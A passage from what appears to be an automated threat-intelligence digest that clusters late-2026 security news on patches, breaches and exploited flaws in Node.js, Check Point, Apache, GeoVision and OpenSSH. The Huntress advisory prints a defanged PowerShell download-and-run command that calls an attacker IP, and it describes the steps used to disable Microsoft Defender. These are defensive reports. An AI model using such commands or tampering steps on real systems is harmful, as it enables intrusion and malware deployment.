allow a low-privileged user to gain root privileges. (Fixed in Secure Access Client for Linux 26.10.4 and later) The security updates, Citrix said, follow a deeper review of its codebase by integrating artificial intelligence (AI)-assisted code analysis to detect and resolve vulnerabilities with an aim to harden the products before potential threats co
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Citrix Patches 12 NetScaler and Secure Access Client Flaws, Including Authentication Bypass
  - Published: 2026-11-12T15:38:49+00:00
  - Link: https://thehackernews.com/2026/11/citrix-patches-12-netscaler-and-secure.html
  - Summary: Citrix has released patches for multiple critical security flaws impacting NetScaler ADC, Citrix NetScaler Gateway, and NetScaler Console that could lead to denial-of-service (DoS) or an authentication bypass. The critical vulnerabilities that impact NetScaler ADC and NetScaler Gateway are listed below - CVE-2026-120868 (CVSS score: 9.3) - A memory overflow vulnerability in Packet

### Cluster c1406e4930 — score 10

- Title: Node.js Fixes 16 Flaws, Including HTTP/2 Bugs That Crash Servers and Leak Other Connections' Data
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-12T08:20:37+00:00
- Link: https://thehackernews.com/2026/11/nodejs-fixes-16-flaws-including-http2.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: Anthropic/Claude, GitHub
- cve_ids: CVE-2026-123863, CVE-2026-123864, CVE-2026-123865, CVE-2026-123866, CVE-2026-123874
- urgency_signals: preauth_unauth
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_products: Anthropic/Claude, GitHub
- cve_ids: CVE-2026-123863, CVE-2026-123866, CVE-2026-123864, CVE-2026-123865, CVE-2026-123874
- urgency_signals: preauth_unauth
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A flaw fixed in Node.js this week lets unauthenticated clients crash servers that use the runtime's built-in HTTP/2 support on the 24.x and 26.x release lines. A second HTTP/2 flaw can cause a server to send a client pieces of its memory, including responses intended for other connections. Fixed versions were released for all three supported lines: 22.23.5, 24.22.3, and 26.13.1. The crash
```

#### Full body

```
Node.js Fixes 16 Flaws, Including HTTP/2 Bugs That Crash Servers and Leak Other Connections' Data  Swati Khandelwal  Nov 12, 2026 Vulnerability / Web Security A flaw fixed in Node.js this week lets unauthenticated clients crash servers that use the runtime's built-in HTTP/2 support on the 24.x and 26.x release lines. A second HTTP/2 flaw can cause a server to send a client pieces of its memory, including responses intended for other connections. Fixed versions were released for all three supported lines: 22.23.5, 24.22.3, and 26.13.1. The crash flaw, CVE-2026-123863 , needs only a default HTTP/2 server that replies before the request body has fully arrived. The Node.js project calls that behavior typical. The crash works over both TLS and cleartext connections. The memory flaw, CVE-2026-123866, affects all three lines. From 24.22.0 and 26.9.0 onward, a client alone can trigger it. On 22.x and older 24.x and 26.x builds, it can still be triggered when the server itself closes a stream partway through a response, for example after an idle timeout. A separate flaw in Node.js HTTPS servers, CVE-2026-123864, can allow an unauthenticated client to read memory from other connections, "including TLS private keys and other users' requests," the project says. It affects all three supported lines. The flaw needs a handler that calls res.flushHeaders() before the request body has fully arrived and later calls res.end() with data. Reading the leaked memory also needs a route that sends back or stores a request body. Plain HTTP servers built with node:http are not affected. The release fixes 16 vulnerabilities in Node.js itself, seven of them rated high. The other four high-rated flaws, and the servers they affect, are: CVE-2026-123865 : a client can make any default HTTP/2 server hold memory and file descriptors permanently, on all three lines. CVE-2026-123874 : a client can corrupt server memory on 24.x and 26.x when the server serves files with stream.respondWithFile() or stream.respondWithFD(). On all three lines, canceling such downloads can also crash the server (CVE-2026-123875, rated medium). CVE-2026-126051 : a client can crash a TLS server on 24.x and 26.x if the server uses the SNICallback, OCSPRequest, newSession or resumeSession hooks, or server.addContext(). CVE-2026-123872 : on a TLS server with stricter client-certificate rules for some hostnames, a client approved for another hostname can switch to a stricter one during TLS 1.2 renegotiation without meeting its rules. All three lines are affected. The eight flaws above are all in Node.js's own HTTP/2, HTTPS and TLS server code, so they matter where a Node.js process accepts those connections itself. Updating to the fixed version for each line is the only fix in the project's security advisory . It lists no workaround for servers that cannot update yet. End-of-life lines, including 20.x and 25.x, get no fix in this release, and the project says such versions are always affected. The advisory does not report any attacks using the flaws. It also does not say whether servers that met the conditions for the HTTPS flaw should replace their TLS keys or other secrets after updating. Five of the flaws, including CVE-2026-123863 and CVE-2026-123864, were reported by Chris Rohlf in collaboration with Claude and Anthropic Research, according to the advisory. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  network security , Vulnerability , Web Security ⚡ Top Stories This Week Google Disrupts 1.3 Million-Device Android Botnet, Says TV Box Maker Sold Criminal Access Claude Code's “Don't Ask Again” File Exposes Passwords and Keys in 1,122 Public Copies on GitHub Hackers Target OpenSSH SSHole Flaw Within Hours of Disclosure, Gain Root on Honeypot Microsoft Paint RCE Fix Now Available, but Windows Update Won't Deliver It Hackers Hide Linux Backdoor in Control Web P
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Node.js Fixes 16 Flaws, Including HTTP/2 Bugs That Crash Servers and Leak Other Connections' Data
  - Published: 2026-11-12T08:20:37+00:00
  - Link: https://thehackernews.com/2026/11/nodejs-fixes-16-flaws-including-http2.html
  - Summary: A flaw fixed in Node.js this week lets unauthenticated clients crash servers that use the runtime's built-in HTTP/2 support on the 24.x and 26.x release lines. A second HTTP/2 flaw can cause a server to send a client pieces of its memory, including responses intended for other connections. Fixed versions were released for all three supported lines: 22.23.5, 24.22.3, and 26.13.1. The crash

### Cluster 7ca18b7a94 — score 10

- Title: Where supercomputing meets agentic AI: What’s new in Google Cloud HPC and AI at SC26
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-11-13T17:00:00+00:00
- Link: https://cloud.google.com/blog/topics/hpc/whats-new-in-hpc-and-ai-at-sc26/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 2
- Strong signals: Google Cloud

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Anthropic/Claude, Google Cloud, Google/Gemini
- urgency_signals: zero_day
- content_type: incident_report, news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Google Cloud, Google/Gemini
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Computational scientists and HPC engineers have always been among the earliest adopters of new computing paradigms, and agents are no exception. Today, research and engineering teams use AI models and agents for things such as ingesting dense scientific literature, optimizing code, and autonomously steering simulations. Yet moving from an agent that suggests code optimizations to an agentic system that reliably architects, provisions, and optimizes production HPC workloads at scale takes more than a general-purpose reasoning model. Without deep infrastructure and domain context, an unguided agent can still pair incompatible storage tiers with compute-optimized VMs, overlook placement policies, or stall when diagnosing a multi-node MPI fabric error. That challenge led our team to ask a simple question: What if we could package our deep HPC and scientific expertise into reusable agent skills, turning complex setup and optimization into guided workflows? At SC26, we are showing how Google
```

#### Full body

```
HPC Where supercomputing meets agentic AI: What’s new in Google Cloud HPC and AI at SC26 November 13, 2026 Megan Gawlik Product Manager, HPC Annie Ma-Weaver Group Product Manager, HPC Try Gemini today The front door to AI in the workplace Try now Computational scientists and HPC engineers have always been among the earliest adopters of new computing paradigms, and agents are no exception. Today, research and engineering teams use AI models and agents for things such as ingesting dense scientific literature, optimizing code, and autonomously steering simulations. Yet moving from an agent that suggests code optimizations to an agentic system that reliably architects, provisions, and optimizes production HPC workloads at scale takes more than a general-purpose reasoning model. Without deep infrastructure and domain context, an unguided agent can still pair incompatible storage tiers with compute-optimized VMs, overlook placement policies, or stall when diagnosing a multi-node MPI fabric error. That challenge led our team to ask a simple question: What if we could package our deep HPC and scientific expertise into reusable agent skills, turning complex setup and optimization into guided workflows? At SC26, we are showing how Google Cloud brings agentic HPC to life with reusable skills that teach agents how to build and run HPC workloads. In addition, we’re also demonstrating evolutionary agents that optimize your algorithms at cloud scale, and purpose-built supercomputing infrastructure designed for where HPC meets AI. Teaching agents to speak HPC: From blueprints to skills Organizations rely on Cluster Toolkit to deploy repeatable, production-ready HPC environments on Google Cloud through declarative YAML blueprints. Now we are expanding these capabilities by pairing Cluster Toolkit with composable agent skills with self-describing, deterministic tools, validated through automated, end-to-end testing and available for download from the Google Skills and DeepMind Science Skills repositories. Together, this delivers: Infrastructure skills that validate before they deploy : When you ask an agent to stand up a cluster, the skill directs it to first audit your compute and storage quotas, run rapid canary checks for regional capacity, match your workload to a validated Cluster Toolkit blueprint, and wait for human approval, all before running the gcluster deploy command. Workload-specific skills that know the science : After your cluster is live, domain skills connected to Google Skills and DeepMind Science Skills guide the agent through things like configuring OpenFOAM and Siemens STAR-CCM+ fluid dynamics runs, tuning GROMACS and AlphaFold 3 life-sciences pipelines, or launching Devito and Open Porous Media (OPM) subsurface simulations with browser-based 3D visualization. Built-in governance and Day-2 diagnostics : Agents operate inside strict IAM, Kueue quota, and budget guardrails, with full provenance in Cloud Logging and structured troubleshooting skills ( gke-kueue-debugging ) to resolve stuck queues or node drains automatically. Scaling from local prototype to breakthrough code Configuring and running existing solvers is only part of the discovery loop. Across financial services, electronic design automation (EDA), manufacturing, logistics, pharmaceuticals, and AI training, competitive advantage comes from having the fastest underlying code and algorithms. Historically, squeezing out performance gains required scarce optimization specialists and costly brute-force compute. Developed by Google DeepMind, AlphaEvolve changes the equation by using a Gemini-powered evolutionary loop to iteratively mutate, benchmark, and optimize code and 3D engineering parameters against target metrics. The AlphaEvolve on Cloud Batch solution, streamlines the process of moving from a seed algorithm on a laptop to massive parallel experimentation. With Batch, you get: Automated parallel evaluation : A single gcluster blueprint provisions the AlphaEvol
```

#### Corroborating sources (2)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Where supercomputing meets agentic AI: What’s new in Google Cloud HPC and AI at SC26
  - Published: 2026-11-13T17:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/hpc/whats-new-in-hpc-and-ai-at-sc26/
  - Summary: Computational scientists and HPC engineers have always been among the earliest adopters of new computing paradigms, and agents are no exception. Today, research and engineering teams use AI models and agents for things such as ingesting dense scientific literature, optimizing code, and autonomously steering simulations. Yet moving from an agent that suggests code optimizations to an agentic system that reliably architects, provisions, and optimizes production HPC workloads at scale takes more than a general-purpose reasoning model. Without deep infrastructure and domain context, an unguided agent can still pair incompatible storage tiers with compute-optimized VMs, overlook placement policies, or stall when diagnosing a multi-node MPI fabric error. That challenge led our team to ask a simple question: What if we could package our deep HPC and scientific expertise into reusable agent skills, turning complex setup and optimization into guided workflows? At SC26, we are showing how Google
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Google Cloud Warns Three AMD Turin CPU Flaws Could Leak Data Across Processes in VMs
  - Published: 2026-11-12T12:09:14+00:00
  - Link: https://thehackernews.com/2026/11/google-cloud-warns-three-amd-turin-cpu.html
  - Summary: Google Cloud VMs on AMD Turin chips need a guest OS patch and a stop-and-start to protect against three CPU side-channel flaws, Google said this week. The company has already applied mitigations against attacks between VMs, and between VMs and the host. Inside a VM, the flaws may let an attacker with code on the same processor core infer data from other processes or the kernel. The affected

### Cluster 8612af1425 — score 9

- Title: Microsoft Patch Tuesday November 2026, (Tue, Nov 10th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-11-11T18:28:43+00:00
- Link: https://isc.sans.edu/diary/rss/33508
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Microsoft continues its AI-induced patch surge, addressing 1,260 different vulnerabilities this month. 68 of these vulnerabilities are considered critical. 167 of the vulnerabilities are Chromium issues affecting Microsoft Edge.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Microsoft Patch Tuesday November 2026, (Tue, Nov 10th)
  - Published: 2026-11-11T18:28:43+00:00
  - Link: https://isc.sans.edu/diary/rss/33508
  - Summary: Microsoft continues its AI-induced patch surge, addressing 1,260 different vulnerabilities this month. 68 of these vulnerabilities are considered critical. 167 of the vulnerabilities are Chromium issues affecting Microsoft Edge.

### Cluster 22daa41adf — score 9

- Title: Attackers Searching for SAP Netweaver Webshells, (Mon, Nov 9th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-11-09T18:18:15+00:00
- Link: https://isc.sans.edu/diary/rss/33502
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Just saw a new (to me) URL in our honeypot data today:
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Attackers Searching for SAP Netweaver Webshells, (Mon, Nov 9th)
  - Published: 2026-11-09T18:18:15+00:00
  - Link: https://isc.sans.edu/diary/rss/33502
  - Summary: Just saw a new (to me) URL in our honeypot data today:

### Cluster bfd8c8319c — score 9

- Title: GeoVision Camera Software Abused to Deploy XMRig Cryptominer
- Source: Huntress (detection_response_operations)
- Published: 2026-11-13T14:00:00+00:00
- Link: https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Microsoft Defender, Microsoft Windows, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Microsoft Defender, Microsoft Windows, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Attackers abused publicly exposed GeoVision camera software at 13 organizations, tried to disable Defender, and deployed XMRig. Get the IoCs and next steps.
```

#### Full body

```
Home Blog Threat Advisory: GeoVision Camera Software Exploited to Drop XMRig Published: November 13, 2026 Threat Advisory: GeoVision Camera Software Exploited to Drop XMRig By: Austin Worline Peter Moote Anthony Gibbs Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Acknowledgements : Special thanks to Zach Rogers, Cristian Poenaru, Harry Godridge, and Tanner Filip for their contributions to the analysis and triage associated with this investigation and this writeup. Background The Huntress SOC observed widespread malicious activity stemming from GeoVision webcam software this week, with the bulk of the attacks occurring between November 8 and November 10. GeoVision is a Taiwanese surveillance and access-control company. We have seen malicious activity across ten accounts and 13 organizations (all across various industries). All malicious activity stemmed from GeoStartupAgentService.exe ; across many endpoints, the activity was run under the NT AUTHORITY\SYSTEM account. A search on Shodan for impacted endpoints' external IPs indicated publicly exposed GeoVision devices or management interfaces. Figure 1: Suspicious command stemming from GeoStartupAgentService.exe The detected activity originating from this parent process exhibited a similar attack chain and dropped files across most endpoints. Figure 2 breaks down the attack chain we observed. Figure 2: The attack chain observed by the SOC across multiple organizations What we saw On various endpoints where this software was publicly exposed, we first saw the GeoVision service spawn a command shell: cmd.exe /c powershell -c iex (new-object net.webclient).downloadstring('hxxp://45[.]32[.]117[[.]]34/a') The command then led to the launch of various PowerShell scripts both in memory and downloaded to disk ( a , b , and c ) from 45.32.117[.]34 . The PS1 extension will be added to these to help with readability. We observed a.ps1 being detonated in memory before searching for writable directories and checking if Microsoft Defender is active on the victim's environment. The secondary script ( b.ps1 ) was written to disk before being detonated using WMI. This script also performed the same writable folder probe as the previous script before downloading kvckiller.sys . Closer inspection via VirusTotal reveals this to be a Windows kernel-mode driver ( wsftprm.sys ) that's previously been abused in Bring Your Own Vulnerable Driver (BYOVD) attacks as a way for threat actors to tamper with antivirus protections like Microsoft Defender. Figure 3: VirusTotal search for wsftprm.sys , which has been seen in the wild as kvckiller.sys At this stage of the attack, we also observed attackers configuring three IFEO Debugger hijacks, which abuse a Windows troubleshooting feature. Image File Execution Options (IFEO) lets administrators configure a "debugger" to start when a particular executable is launched. The setting is stored in the Windows Registry under a key named for that executable. This particular attack targeted Windows Defender components MsMpEng.exe (the Microsoft Defender Antivirus engine), SecurityHealthService.exe (the Windows Security service), and SecurityHealthSystray.exe (the Windows Security notification-area app). When Windows or another component tries to start one of those executables, the IFEO setting redirected the launch to systray.exe instead. This is a likely attempt to interfere with the launch of those components, as redirecting the launch to systray.exe can keep the intended security process from starting, depending on how the replacement is configured. Finally, c.ps1 was detonated in memory. This script's main purpose was to download and execute update.exe in the current directory, which was a custom Golang loader (reaching out to 156.246.94[.]183 ). At the time of the investigation, this IP was associated with the domain cctv-update[.]top , which was registered on November 7 at 02:40 UTC. This binary includes a BitTorrent Mainline DHT client and a PKA
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: GeoVision Camera Software Abused to Deploy XMRig Cryptominer
  - Published: 2026-11-13T14:00:00+00:00
  - Link: https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer
  - Summary: Attackers abused publicly exposed GeoVision camera software at 13 organizations, tried to disable Defender, and deployed XMRig. Get the IoCs and next steps.

### Cluster 9ce12b8d82 — score 9

- Title: Check Point warns of zero-day flaw exploited for root access
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-11-13T10:44:22+00:00
- Link: https://www.bleepingcomputer.com/news/security/check-point-patches-zero-day-that-lets-hackers-get-root-access/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
- affected_products: Ivanti, Microsoft 365, VMware
- cve_ids: CVE-2026-123039, CVE-2026-85102, CVE-2026-93616
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, web_shell_backdoor, active_exploitation
- affected_products: Ivanti, VMware, Microsoft 365
- cve_ids: CVE-2026-123039, CVE-2026-93616, CVE-2026-85102
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Check Point Software has released emergency hotfixes to address a high-severity flaw that hackers have been exploiting to gain root privileges and establish persistence on vulnerable devices since late October. [...]
```

#### Full body

```
Check Point warns of zero-day flaw exploited for root access By Sergiu Gatlan November 13, 2026 05:44 AM 0 Check Point Software has released emergency hotfixes to address a high-severity flaw that hackers have been exploiting to gain root privileges and establish persistence on vulnerable devices since late October. Tracked as CVE-2026-123039 , this local privilege escalation vulnerability was found in the DynamicCLI IPC (Inter-Process Communication) interface used to send privileged command requests to the root-level Gaia OS DynamicCLI (dynamic_server) daemon. "Check Point observed an active exploit of this vulnerability against a couple of dozen customers," the company warned in a Thursday security advisory. "The Gaia OS DynamicCLI daemon runs as root and listens on a world-writable local socket (/tmp/dynamic_socket) without authenticating connecting processes. An authenticated local user can send a command to the socket and have it executed as root." The list of Check Point products vulnerable to attacks exploiting the CVE-2026-123039 flaw includes the company's Firewall, Multi-Domain Security Management Server, Scalable Platforms, Security Gateway, and Security Management Server. In a separate report, Check Point said the attackers first gained access to the Mobile Access portal by exploiting the PHP2Shell vulnerabilities , then escalated privileges to root using CVE-2026-123039 zero-day exploits. Next, the threat actors dropped webshells and installed TSGA backdoor and TSProxy malware that was previously spotted while investigating attacks targeting Ivanti appliances, then pivoted from the compromised gateway to a VMware ESXi host and deployed destructive wiper malware. CVE-2026-123039 attack chain (Check Point) Check Point advised security teams who can't immediately deploy the CVE-2026-123039 hotfixes to stop the dynamic_server process and prevent it from restarting as a temporary mitigation measure. The company also shared indicators of compromise (IOCs) , and it said that customers can find evidence of compromise by checking for commands commonly associated with exploitation attempts, the use of the system() sink (uncommon or absent in legitimate traffic), and commands that don't use the default Clish wrapper (indicating that it was executed as root through the socket and requires further investigation). In September, Check Point warned customers that attackers had been exploiting two other critical Security Management Server (CVE-2026-93616) and Security Gateway (CVE-2026-85102) remote code execution (RCE) vulnerabilities in zero-day attacks that didn't require privileges on the targeted systems. Over the last two years, the US Cybersecurity and Infrastructure Security Agency (CISA) has added five Check Point flaws to its catalog of actively exploited vulnerabilities, two of which have also been abused by ransomware gangs. Uncover email threats your existing defenses may miss. Adaptive Security's AI agents analyze email intent, context, and behavior to uncover phishing, business email compromise, and invoice fraud. See what's getting through with a 14-day read-only scan of Microsoft 365 or Google Workspace, with no MX changes. Start your free email security scan. Related Articles: Google fixes actively exploited Android zero-day on Pixel devices Ivanti patches two more Connect Secure zero-days chained in attacks Tailscale warns of SSH flaws allowing root privilege escalation TeamViewer urges users to patch severe flaws “as soon as possible” Check Point warns of Management Server zero-day exploited in attacks
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Check Point warns of zero-day flaw exploited for root access
  - Published: 2026-11-13T10:44:22+00:00
  - Link: https://www.bleepingcomputer.com/news/security/check-point-patches-zero-day-that-lets-hackers-get-root-access/
  - Summary: Check Point Software has released emergency hotfixes to address a high-severity flaw that hackers have been exploiting to gain root privileges and establish persistence on vulnerable devices since late October. [...]

### Cluster f326b30326 — score 9

- Title: Apache HTTP Server patches critical HTTP/2 remote code execution flaw
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-11-12T19:12:55+00:00
- Link: https://www.bleepingcomputer.com/news/security/apache-http-server-patches-critical-http-2-remote-code-execution-flaw/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng
- affected_products: Anthropic/Claude, GitLab, Google Cloud
- cve_ids: CVE-2026-106023, CVE-2026-109163, CVE-2026-119618
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, active_exploitation
- affected_products: GitLab, Google Cloud, Anthropic/Claude
- cve_ids: CVE-2026-119618, CVE-2026-106023, CVE-2026-109163
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical vulnerability in the HTTP/2 module of Apache HTTP Server could be exploited by an unauthenticated attacker to obtain remote code execution (RCE). [...]
```

#### Full body

```
Apache HTTP Server patches critical HTTP/2 remote code execution flaw By Bill Toulas November 12, 2026 02:12 PM 0 A critical vulnerability in the HTTP/2 module of Apache HTTP Server could be exploited by an unauthenticated attacker to obtain remote code execution (RCE). The Apache Software Foundation has fixed the issue, now tracked as CVE-2026-119618, but a significant number of servers are vulnerable and reachable over the public internet. Discovered by Anthropic’s OSS Scanner and Google Cloud’s Vulnerability Research teams, the vulnerability is a race condition in the mod_http2 module that can corrupt heap memory. An attacker successfully exploiting it could run code with the web server process’s privileges in HTTP Server versions 2.4.55 through 2.4.70, and standalone mod_h2 version 2.0.8 through 2.0.42. Apache describes the problem as “Concurrent Execution using Shared Resource with Improper Synchronization vulnerability in Apache HTTP Server's mod_http2 in assign_headers() can lead to RCE.” Apache HTTP Server is a free and open-source software that handles requests from web browsers and serves pages, images, and other website content. It is a widely used tool estimated to back roughly one out of five websites . According to telemetry data from cloud security company Wiz, 64% of the cloud environments have vulnerable resources, and roughly half of them have publicly exposed instances. However, the numbers do not account for server configuration, which requires HTTP/2 to be enabled ( default is off ). Researchers at cybersecurity company watchTowr confirmed this condition and recommend technicians to "patch now or drop h2 until you can." "Due to improper synchronization when executing concurrent threads sharing resources, an attacker can trigger heap corruption," Wiz researchers say . "This memory corruption can ultimately be leveraged to achieve RCE on the hosting server, allowing unauthorized threat actors to execute arbitrary commands with the privileges of the web server process." Wiz assesses the severity of the vulnerability to be critical, although no official score is available. The company says that it is currently unaware of any public exploits or attacks targeting the flaw, but this could change soon. The latest version of Apache HTTP Server also addresses two additional flaws, CVE-2026-106023 - a null pointer dereference in ‘mod_md,’ and CVE-2026-109163 - a low-severity data overwrite flaw in ‘mod_vhost_alias.’ Uncover email threats your existing defenses may miss. Adaptive Security's AI agents analyze email intent, context, and behavior to uncover phishing, business email compromise, and invoice fraud. See what's getting through with a 14-day read-only scan of Microsoft 365 or Google Workspace, with no MX changes. Start your free email security scan. Related Articles: Over 1,000 GitLab servers vulnerable to ongoing RCE attacks CISA says max severity GitLab flaw now exploited in the wild GitLab warns of new max severity code execution vulnerability GitLab warns of max severity code execution vulnerability Critical 'HTTP2Shell' Brotli vulnerability triggers emergency patches
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Apache HTTP Server patches critical HTTP/2 remote code execution flaw
  - Published: 2026-11-12T19:12:55+00:00
  - Link: https://www.bleepingcomputer.com/news/security/apache-http-server-patches-critical-http-2-remote-code-execution-flaw/
  - Summary: A critical vulnerability in the HTTP/2 module of Apache HTTP Server could be exploited by an unauthenticated attacker to obtain remote code execution (RCE). [...]

### Cluster e7cfd3c1d8 — score 9

- Title: City of Osaka warns of data breach impacting 1 million as Japan reels from dozens of cyber incidents
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-11-13T19:43:00+00:00
- Link: https://therecord.media/city-of-osaka-japan-email-data-breach
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: financial_services, government, telecommunications
- affected_products: Anthropic/Claude
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: financial_services, government, telecommunications
- affected_products: Anthropic/Claude
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Osaka, Japan's third-largest city, told its 2.8 million residents to be wary of suspicious emails purporting to come from the local government.
```

#### Full body

```
Osaka City Hall. Image: Wikimedia Commons / Oilstreet / CC BY-SA 3.0 City of Osaka warns of data breach impacting 1 million as Japan reels from dozens of cyber incidents The city of Osaka notified the public that a data breach involving a third-party technology provider exposed more than 1 million email addresses tied to an online administrative services platform. According to a statement published by the government of Japan’s third-largest city, hackers accessed the Arara email distribution service used by TKC Corporation , the company contracted to maintain the administrative services platform. Anyone who received an email from the system run by the city between July 2026 and October 31 had their email address leaked, according to the city. They warned the city’s 2.8 million residents to be wary of suspicious emails purporting to come from the city — urging everyone not to open any URLs or attachments. The city breach came days after the regional government of the Osaka Prefecture announced its own data breach involving the information of food support program participants. The attack on Arara has had a cascading effect on dozens of large businesses and governments in Japan. The company said a November 2 cyberattack exposed 77 million email addresses from nearly 400 customers, including TKC, gaming giant Sega and others. Arara noted that hackers used their email distribution service to send millions of malicious emails pretending to be credit card companies and financial institutions. ‘Let us mobilize’ Japan has been rocked by months of cyberattacks on critical companies and institutions — from Japan Airlines to Sony Network Communications and gaming company Capcom . Last week, Japanese Prime Minister Sanae Takaichi held a cabinet meeting on cybersecurity and announced a package of emergency measures aimed at increasing the use of AI for cyber defense, more robust information gathering, offensive cyberattacks and increased support for data breach victims. About $62 million in emergency funds were dedicated to the effort and companies were urged to report cyberattacks more quickly to government agencies. “Even at this very moment, incidents of unauthorized access and information leaks continue to occur, significantly affecting people's daily lives and business activities,” she said. “Let us mobilize the full resources of the government to strengthen Japan's overall capabilities to respond to cyberattacks.” Japan's national Computer Security Incident Response Team published a study three weeks ago that said it found evidence attackers are using AI to scan for known vulnerabilities before carrying out attacks in the country. Mihoko Matsubara, the chief cybersecurity strategist at Japanese telecom giant NTT, told Recorded Future News that recent data showed cyberattacks on Japanese systems began to grow in July and skyrocketed through October. October saw 58% of all reported incidents this year in Japan, she said. About 380 million pieces of personal data have been stolen so far this year. A large amount of Japanese personal information is already being traded on the dark web, and some of the data has been used for fraudulent securities transactions, Matsubara said, warning that determined actors with financial resources could compile a comprehensive database of Japanese citizens' socioeconomic activities and personal preferences. Matsubara, who previously worked for Japan’s Ministry of Defense and other government cybersecurity committees, noted that the recent surge in breaches came after new cybersecurity legislation came into effect that allows the government to take more robust action in the event of a significant cyberattack. “Many countries would be keen to learn how quickly Japan would respond to which kinds of cyberattacks, and with what level of intensity,” she said. Matsubara added that the recent breaches appear to involve AI-tools like Claude and Artex , which help cybercriminals uncover and exploit bugs. But she arg
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: City of Osaka warns of data breach impacting 1 million as Japan reels from dozens of cyber incidents
  - Published: 2026-11-13T19:43:00+00:00
  - Link: https://therecord.media/city-of-osaka-japan-email-data-breach
  - Summary: Osaka, Japan's third-largest city, told its 2.8 million residents to be wary of suspicious emails purporting to come from the local government.

### Cluster bf6b5c1d3c — score 9

- Title: New OpenSSH Vulnerability
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-11-10T12:02:38+00:00
- Link: https://www.schneier.com/blog/archives/2026/11/new-openssh-vulnerability.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
It’s a bad one , and it’s been in the code for a decade: A newly disclosed flaw involving OpenSSH and musl, dubbed “*sshole,” allows attackers to log in to certain Alpine Linux and other musl-based Linux accounts configured to block password authentication simply by entering an oversized password. “Oversized” means longer than 256 bytes. Details . Slashdot thread . And another news article .
```

#### Full body

```
